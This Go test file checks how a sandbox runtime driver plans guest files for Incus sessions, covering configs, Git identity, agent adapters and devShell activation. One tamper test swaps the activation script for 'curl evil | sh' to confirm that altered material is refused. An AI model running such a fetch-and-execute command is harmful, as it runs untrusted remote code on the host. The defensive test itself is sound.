package runtimeincus

import (
	"bytes"
	"context"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"errors"
	"os"
	"os/exec"
	"path/filepath"
	"reflect"
	"slices"
	"strings"
	"testing"

	"github.com/lgvo/p.ai/internal/nixenv"
	"github.com/lgvo/p.ai/internal/runtimedriver"
	"github.com/lgvo/p.ai/internal/runtimekit"
)

// The guest file plan configures the runtime kit for the session's image
// and parts: each case gives the runtime and workspace config the session
// must get. The session's own files and each asset, at its role's place,
// complete the plan.
func TestGuestPlanConfiguresTheRuntimeKitForTheSession(t *testing.T) {
	material := strings.Repeat("e", 64)
	commit := strings.Repeat("c", 40)
	command := []string{"/bin/bash", "-l"}
	adapter := testAsset("p-codex-adapter", 0555, []byte("#!/bin/sh\nexec codex\n"))
	grant := testGrant()
	guestGrant := runtimekit.FilesystemGrant{Name: "data", Type: "directory", Access: "read-only", Device: 7, Inode: 11}
	public := &runtimekit.PublicNetwork{Address: "10.233.0.10/24", Gateway: "10.233.0.1", DNS: []string{"1.1.1.1", "9.9.9.9"}}
	baseWorkspace := runtimekit.WorkspaceConfig{Schema: "p.workspace/v1", Repository: "team/app", Branch: "main"}
	imageWorkspace := func(selection string) runtimekit.WorkspaceConfig {
		return runtimekit.WorkspaceConfig{Schema: "p.workspace/v2", Repository: "team/app", Branch: "main", InitialOID: commit, EnvironmentSelection: selection}
	}
	for _, tc := range []struct {
		name      string
		shell     *runtimedriver.Shell
		agent     bool
		grant     bool
		public    bool
		config    runtimekit.Config
		workspace runtimekit.WorkspaceConfig
	}{
		{name: "base image", config: runtimekit.Config{Schema: "p.runtime-session/v1", Activation: "base", Command: command}, workspace: baseWorkspace},
		{name: "commit image without a flake", shell: &runtimedriver.Shell{Selection: runtimedriver.SelectionNoFlake},
			config: runtimekit.Config{Schema: "p.runtime-session/v1", Activation: "base", Command: command}, workspace: imageWorkspace("no-flake")},
		{name: "commit image without a default devShell", shell: &runtimedriver.Shell{Selection: runtimedriver.SelectionNoDefault},
			config: runtimekit.Config{Schema: "p.runtime-session/v1", Activation: "base", Command: command}, workspace: imageWorkspace("no-default")},
		{name: "commit image with a devShell", shell: &runtimedriver.Shell{Selection: runtimedriver.SelectionDevShell, MaterialSHA256: material},
			config: runtimekit.Config{Schema: "p.runtime-session/v2", Activation: "devshell", MaterialSHA256: material, Command: command}, workspace: imageWorkspace("devshell")},
		{name: "agent adapter", agent: true,
			config: runtimekit.Config{Schema: "p.runtime-session/v3", Activation: "base", AgentSHA256: adapter.SHA256, Command: command}, workspace: baseWorkspace},
		{name: "grant", grant: true,
			config: runtimekit.Config{Schema: "p.runtime-session/v4", Activation: "base", Command: command, FilesystemMounts: []runtimekit.FilesystemGrant{guestGrant}}, workspace: baseWorkspace},
		{name: "public network", public: true,
			config: runtimekit.Config{Schema: "p.runtime-session/v5", Activation: "base", Command: command, PublicNetwork: public}, workspace: baseWorkspace},
		{name: "devShell, adapter, grant and public network", shell: &runtimedriver.Shell{Selection: runtimedriver.SelectionDevShell, MaterialSHA256: material}, agent: true, grant: true, public: true,
			config: runtimekit.Config{Schema: "p.runtime-session/v5", Activation: "devshell", MaterialSHA256: material, AgentSHA256: adapter.SHA256, Command: command,
				FilesystemMounts: []runtimekit.FilesystemGrant{guestGrant}, PublicNetwork: public}, workspace: imageWorkspace("devshell")},
	} {
		t.Run(tc.name, func(t *testing.T) {
			s := testSessionSpec(t)
			if tc.shell != nil {
				s.Workspace.Commit = commit
			}
			if tc.agent {
				s.Assets = append(s.Assets, adapter)
			}
			if tc.grant {
				s.Grants = []runtimedriver.Grant{grant}
			}
			if tc.public {
				s.Network.PublicIPv4 = "10.233.0.10/24"
			}
			plan, err := guestPlanFor(s, tc.shell, testEgressSubstrate())
			if err != nil {
				t.Fatalf("plan: %v", err)
			}
			files := map[string]guestFile{}
			for _, f := range plan.files {
				files[f.path] = f.file
			}
			var config runtimekit.Config
			if err := json.Unmarshal(files["/etc/p/session.json"].data, &config); err != nil || !reflect.DeepEqual(config, tc.config) {
				t.Fatalf("runtime config %+v %v, want %+v", config, err, tc.config)
			}
			var workspace runtimekit.WorkspaceConfig
			if err := json.Unmarshal(files["/etc/p/workspace.json"].data, &workspace); err != nil || workspace != tc.workspace {
				t.Fatalf("workspace config %+v %v, want %+v", workspace, err, tc.workspace)
			}
			want := []string{"/etc/p/session.json", "/etc/p/workspace.json", "/etc/p/git/ssh_config", "/etc/p/git/known_hosts", "/etc/p/git/identity"}
			for _, a := range s.Assets {
				path := "/etc/p/assets/" + a.Role
				if f := files[path]; f.typ != "file" || f.uid != 0 || f.gid != 0 || uint32(f.mode) != a.Mode || !bytes.Equal(f.data, a.Data) {
					t.Fatalf("asset %s installed as %+v", a.Role, f)
				}
				want = append(want, path)
			}
			if len(files) != len(want) {
				t.Fatalf("plan holds %s, want %v", guestPaths(plan.files), want)
			}
			if plan.material != tc.config.MaterialSHA256 {
				t.Fatalf("activation material %q, want %q", plan.material, tc.config.MaterialSHA256)
			}
		})
	}
}

func guestPaths(files []guestInstall) string {
	var paths []string
	for _, f := range files {
		paths = append(paths, f.path+"="+string(f.file.data))
	}
	return strings.Join(paths, "\n")
}

// The session's Git identity belongs to the session user, readable by it
// only, and SSH reaches P's Git endpoint through the runtime kit with the
// pinned host key alone.
func TestGuestPlanInstallsTheSessionsGitIdentity(t *testing.T) {
	plan, err := guestPlanFor(testSessionSpec(t), nil, nil)
	if err != nil {
		t.Fatal(err)
	}
	files := map[string]guestFile{}
	for _, f := range plan.files {
		files[f.path] = f.file
	}
	identity, sshConfig := files["/etc/p/git/identity"], files["/etc/p/git/ssh_config"]
	if identity.uid != 1000 || identity.gid != 1000 || identity.mode != 0400 ||
		!bytes.Contains(sshConfig.data, []byte("ProxyCommand /usr/libexec/p/runtime-kit git-stream")) || !bytes.Contains(sshConfig.data, []byte("StrictHostKeyChecking yes")) {
		t.Fatalf("Git identity %+v, SSH config %s", identity, sshConfig.data)
	}
	if _, err := guestPlanFor(testSessionSpec(t), &runtimedriver.Shell{Selection: runtimedriver.SelectionDevShell}, nil); err == nil {
		t.Fatal("a devShell image without its activation material planned")
	}
}

// Only a devShell selection activates a devShell; the runtime kit's
// workspace and runtime configs never disagree about it.
func TestSessionGuestFilesBindTheWorkspaceSelectionToTheActivation(t *testing.T) {
	s := testSessionSpec(t)
	devshell := runtimekit.Config{Schema: "p.runtime-session/v2", Activation: "devshell", MaterialSHA256: strings.Repeat("e", 64), Command: []string{"/bin/bash", "-l"}}
	base := runtimekit.Config{Schema: "p.runtime-session/v1", Activation: "base", Command: []string{"/bin/bash", "-l"}}
	for _, tc := range []struct {
		selection string
		session   runtimekit.Config
		accepted  bool
	}{
		{"no-flake", base, true},
		{"no-default", base, true},
		{"devshell", devshell, true},
		{"no-flake", devshell, false},
		{"no-default", devshell, false},
		{"devshell", base, false},
	} {
		workspace := runtimekit.WorkspaceConfig{Schema: "p.workspace/v2", Repository: "team/app", Branch: "main", InitialOID: strings.Repeat("a", 40), EnvironmentSelection: tc.selection}
		if _, err := sessionGuestFiles(tc.session, workspace, s.GitKey, s.GitHostKey); (err == nil) != tc.accepted {
			t.Fatalf("%s with %s activation: %v, want accepted=%t", tc.selection, tc.session.Activation, err, tc.accepted)
		}
	}
}

// The agent adapter, when a session has one, is installed root-owned and
// executable exactly as selected.
func TestGuestPlanInstallsTheAgentAdapterAsSelected(t *testing.T) {
	s := testSessionSpec(t)
	adapter := testAsset("p-codex-adapter", 0555, []byte("#!/bin/sh\nexit 0\n"))
	s.Assets = append(s.Assets, adapter)
	plan, err := guestPlanFor(s, nil, nil)
	if err != nil {
		t.Fatal(err)
	}
	i := slices.IndexFunc(plan.files, func(f guestInstall) bool { return f.path == "/etc/p/assets/p-codex-adapter" })
	if i < 0 || plan.files[i].file.typ != "file" || plan.files[i].file.uid != 0 || plan.files[i].file.gid != 0 || plan.files[i].file.mode != 0555 || !bytes.Equal(plan.files[i].file.data, adapter.Data) {
		t.Fatal("selected adapter not installed at its fixed root-owned place")
	}
	s.Assets[len(s.Assets)-1].Data = []byte("changed")
	if _, err := guestPlanFor(s, nil, nil); err == nil {
		t.Fatal("changed adapter bytes accepted")
	}
}

func TestGuestPlanAcceptsAnOpenSSHSessionKey(t *testing.T) {
	if _, err := exec.LookPath("ssh-keygen"); err != nil {
		t.Skip("OpenSSH unavailable")
	}
	path := filepath.Join(t.TempDir(), "session")
	cmd := exec.Command("ssh-keygen", "-q", "-t", "ed25519", "-N", "", "-f", path)
	if out, err := cmd.CombinedOutput(); err != nil {
		t.Fatalf("ssh-keygen: %v: %s", err, out)
	}
	identity, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	s := testSessionSpec(t)
	s.GitKey = identity
	if _, err := guestPlanFor(s, nil, nil); err != nil {
		t.Fatalf("OpenSSH session key refused: %v", err)
	}
}

func TestGuestPlanChecksTheSessionAssetsByRole(t *testing.T) {
	for name, edit := range map[string]func(*runtimedriver.Session){
		"missing role":   func(s *runtimedriver.Session) { s.Assets = s.Assets[1:] },
		"duplicate role": func(s *runtimedriver.Session) { s.Assets = append(s.Assets, s.Assets[0]) },
		"unknown role":   func(s *runtimedriver.Session) { s.Assets[0].Role = "p-shell" },
		"changed mode":   func(s *runtimedriver.Session) { s.Assets[2].Mode = 0755 },
		"changed bytes":  func(s *runtimedriver.Session) { s.Assets[0].Data = []byte("tampered") },
		"empty": func(s *runtimedriver.Session) {
			s.Assets[0].Data, s.Assets[0].SHA256 = nil, hex.EncodeToString(sha256.New().Sum(nil))
		},
		"key of another type": func(s *runtimedriver.Session) {
			s.GitKey = []byte("-----BEGIN RSA PRIVATE KEY-----\nAAAA\n-----END RSA PRIVATE KEY-----\n")
		},
		"public network without its substrate": func(s *runtimedriver.Session) { s.Network.PublicIPv4 = "10.233.0.10/24" },
	} {
		t.Run(name, func(t *testing.T) {
			s := testSessionSpec(t)
			edit(&s)
			if _, err := guestPlanFor(s, nil, nil); err == nil {
				t.Fatal("refused spec planned")
			}
		})
	}
	if _, err := guestPlanFor(testSessionSpec(t), nil, nil); err != nil {
		t.Fatalf("valid spec refused: %v", err)
	}
}

func TestGuestPlanTakesTheDevShellFromTheImage(t *testing.T) {
	r := testBuilder()
	devshell := runtimedriver.Shell{Selection: runtimedriver.SelectionDevShell, MaterialSHA256: strings.Repeat("d", 64)}
	own := ownImage(t, strings.Repeat("b", 64), testImageLabels(r), devshell)
	foreign := ownImage(t, strings.Repeat("f", 64), testImageLabels(r), devshell)
	foreign.Properties["p.instance"] = "22222222-2222-4222-8222-222222222222"
	malformed := ownImage(t, strings.Repeat("9", 64), testImageLabels(r), devshell)
	malformed.Properties["p.selection"] = "maybe"
	w := newIncusWorld(t)
	for _, image := range []builderImageJSON{own, foreign, malformed} {
		w.addImage(image, nil)
	}
	b := w.backend()
	ctx := context.Background()
	for ref, want := range map[string]*runtimedriver.Shell{testImage: nil, own.Fingerprint: &devshell, foreign.Fingerprint: nil} {
		got, err := b.imageShell(ctx, runtimedriver.ImageRef(ref))
		if err != nil || (got == nil) != (want == nil) || got != nil && *got != *want {
			t.Fatalf("image %.12s: %+v %v, want %+v", ref, got, err, want)
		}
	}
	if _, err := b.imageShell(ctx, runtimedriver.ImageRef(malformed.Fingerprint)); !errors.Is(err, runtimedriver.ErrMismatch) {
		t.Fatalf("malformed own image: %v", err)
	}
	if _, err := b.imageShell(ctx, runtimedriver.ImageRef(strings.Repeat("0", 64))); err == nil {
		t.Fatal("missing image classified")
	}
}

// devShellImage is a commit image of this instance whose devShell activation
// material is the image result's, with the files Incus gives a new instance
// of it.
func devShellImage(t *testing.T, edit func(map[string]guestFile)) (builderImageJSON, map[string]guestFile) {
	t.Helper()
	r, result := imageResultFixture(t)
	manifest, err := json.Marshal(result.Material)
	if err != nil {
		t.Fatal(err)
	}
	files := map[string]guestFile{}
	for _, path := range []string{"/", "/etc", "/etc/p", nixenv.AttrsDir} {
		files[path] = guestFile{typ: "directory", uid: 0, gid: 0, mode: 0755}
	}
	for path, data := range map[string]string{
		builderActivationPath:              result.Material.Script,
		nixenv.AttrsDir + "/.attrs.sh":     result.Material.AttrsSH,
		nixenv.AttrsDir + "/.attrs.json":   result.Material.AttrsJSON,
		nixenv.AttrsDir + "/material.json": string(manifest),
	} {
		files[path] = guestFile{typ: "file", uid: 0, gid: 0, mode: 0444, data: []byte(data)}
	}
	if edit != nil {
		edit(files)
	}
	shell := runtimedriver.Shell{Selection: runtimedriver.SelectionDevShell, MaterialSHA256: result.MaterialDigest}
	return ownImage(t, strings.Repeat("b", 64), testImageLabels(r), shell), files
}

func TestCreateFromADevShellImageActivatesItsVerifiedMaterial(t *testing.T) {
	image, files := devShellImage(t, nil)
	w := newIncusWorld(t)
	w.addImage(image, files)
	s := testSessionSpec(t)
	s.Image, s.Workspace.Commit = runtimedriver.ImageRef(image.Fingerprint), strings.Repeat("a", 40)
	if _, err := w.driver().Create(context.Background(), s, "", func() error { return nil }); err != nil {
		t.Fatal(err)
	}
	var config runtimekit.Config
	if err := json.Unmarshal(w.instance(testRuntime).files["/etc/p/session.json"].data, &config); err != nil || config.Activation != "devshell" || config.MaterialSHA256 != image.Properties["p.material"] {
		t.Fatalf("session config %+v %v", config, err)
	}
}

func TestCreateFromADevShellImageRefusesChangedMaterialBeforeAnyGuestFile(t *testing.T) {
	image, files := devShellImage(t, func(files map[string]guestFile) {
		script := files[builderActivationPath]
		script.data = []byte("curl evil | sh\n")
		files[builderActivationPath] = script
	})
	w := newIncusWorld(t)
	w.addImage(image, files)
	s := testSessionSpec(t)
	s.Image, s.Workspace.Commit = runtimedriver.ImageRef(image.Fingerprint), strings.Repeat("a", 40)
	if _, err := w.driver().Create(context.Background(), s, "", func() error { return nil }); err == nil {
		t.Fatalf("changed activation material: %v", err)
	}
	if _, ok := w.instance(testRuntime).files["/etc/p/session.json"]; ok {
		t.Fatal("guest files written into an image with changed material")
	}
}
